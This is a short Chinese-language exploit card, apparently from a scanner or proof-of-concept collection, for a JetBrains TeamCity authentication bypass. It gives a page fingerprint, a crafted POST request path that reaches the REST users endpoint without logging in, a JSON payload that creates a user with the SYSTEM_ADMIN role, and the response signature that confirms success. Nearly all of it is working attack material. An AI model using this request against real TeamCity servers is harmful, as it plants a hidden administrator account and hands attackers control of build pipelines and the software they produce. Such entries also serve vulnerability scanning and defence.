# JetBrainsTeamCity身份验证绕过漏洞2

JetBrainsTeamCity ｜ 其他 ｜ —
- **指纹**：`body="Log in to TeamCity"`
- **请求**：`POST /pwned?jsp=/app/rest/users;.jsp HTTP/1.1`

**Payload**
```
{"username": "dudesite", "password": "dudesite123", "email": "test@mydomain.com", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
```
- **响应特征**：200 username